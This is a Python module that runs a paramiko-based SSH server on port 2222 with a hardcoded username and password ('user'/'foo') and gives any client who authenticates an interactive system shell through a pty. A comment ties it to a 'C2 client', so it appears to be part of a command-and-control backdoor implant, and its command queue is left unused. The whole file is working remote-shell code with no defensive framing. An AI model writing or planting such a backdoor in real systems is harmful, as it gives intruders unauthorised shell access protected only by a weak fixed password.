import socket
import sys
import paramiko
import threading
import traceback
import subprocess
import pty
import os
import select

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
        self.input = ""
        self.username = "user"
        self.password = "foo"

    def check_channel_request(self, kind, chanid): 
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED

        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        print("Authenticating via password")
        if (username == self.username) and (password == self.password):
            return paramiko.AUTH_SUCCESSFUL

        return paramiko.AUTH_FAILED

    def check_auth_publickey(self, username, key):
        key_for_user = paramiko.RSAKey(filename="{0}_key".format(username))
        
        if (key == key_for_user):
            return paramiko.AUTH_SUCCESSFUL
        
        return paramiko.AUTH_FAILED

    def check_auth_gssapi_with_mic(self, username, gss_authenticated=paramiko.AUTH_FAILED, cc_file=None):
        return paramiko.AUTH_FAILED

    def check_auth_gssapi_keyex(self, username, gss_authenticated=paramiko.AUTH_FAILED, cc_file=None):        
        return paramiko.AUTH_FAILED

    def enable_auth_gssapi(self):
        return False
    
    def get_allowed_auths(self, username):
        return "password,publickey"
    
    def check_channel_shell_request(self, channel):
        self.event.set()
        return True
    
    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        return True


class ServerThread(threading.Thread):
    def __init__(self, commands):
        # `commands` is a Queue of commands from the main C2 client class
        super(ServerThread, self).__init__()
        self.server = Server()
        self.commands = commands
        self.stop_request = threading.Event()
        self.QUIT_CMD = "quit"
        self.PORT = 2222

    def run(self):
        sock = self._setup_sock()

        while not self.stop_request.is_set():
            try:
                sock.listen(100)
                print("Listening...")
                client, addr = sock.accept()
                print("Server Connected!")

            except Exception as e:
                print("*** Failed to connect ***")
            
            try:
                chan, trans = self._establish_channel(client)

                if chan is None:
                    print("*** No Channel ***")

                else:
                    print("Authenticated!")

                    self.server.event.wait(10)

                    if not self.server.event.is_set():
                        print("*** Client did not ask for a shell! ***")
                    
                    command = ""
                    self._setup_pty()

                    while command != self.QUIT_CMD:
                        command = self._run_pty(chan)

                    chan.close()
            
                trans.close()

            except paramiko.SSHException as e:
                print("*** SSH negotiation failure ***")

                if chan:
                    chan.close()
                if trans:
                    trans.close()
    
                traceback.print_exc()

    def join(self, timeout=None):
        self.stop_request.set()
        super(ServerThread, self).join(timeout)

    def _setup_sock(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("", self.PORT))

            return sock

        except Exception as e:
            print("*** Failed to open socket ***")
            traceback.print_exc()
            self.stop_request.set()

    def _establish_channel(self, client):
        trans = paramiko.Transport(client)
        
        host_key = paramiko.RSAKey(filename="host_key")
        trans.add_server_key(host_key)
        trans.start_server(server=self.server)
        print("Server started!")

        chan = trans.accept(60)

        return chan, trans

    def _setup_pty(self):
        child_args = [os.environ["SHELL"]]
        (self.pty_pid, self.pty_fd) = pty.fork()

        if self.pty_pid == pty.CHILD:
            os.execlp(child_args[0], *child_args)
            os._exit(-1)

    def _run_pty(self, channel):
        rds, wrs, ers = select.select([self.pty_fd, channel.fileno()], [], [])
        data = ""

        try:
            if self.pty_fd in rds:
                data = os.read(self.pty_fd, 1024)
                channel.send(data)

            if channel.fileno() in rds:
                data = channel.recv(1024)

                while len(data) > 0:
                    n = os.write(self.pty_fd, data)
                    data = data[n:]
        
        # This happens when we `exit` the shell
        except OSError as e:
            data = self.QUIT_CMD

        return data
    
